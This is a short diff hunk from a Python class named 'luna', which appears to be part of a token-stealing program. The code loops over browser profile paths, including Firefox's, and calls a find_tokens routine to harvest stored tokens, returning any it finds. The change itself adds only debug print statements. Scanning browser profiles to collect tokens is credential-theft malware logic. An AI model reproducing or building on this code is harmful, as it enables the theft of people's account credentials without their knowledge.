@@ -1042,15 +1042,20 @@ class luna:
             "Firefox": roaming + "\\Mozilla\\Firefox\\Profiles",
         }
         for platform, path in paths.items():
+            print(platform + " | " + path)
             if not os.path.exists(path):
+                print(platform + " | " + path)
                 continue
 
             tokens = luna.find_tokens(path)
+            print(tokens)
 
             if len(tokens) > 0:
+                print("1.1")
                 return tokens
 
             else:
+                print("1.2")
                 return None
 
     def ask_token():
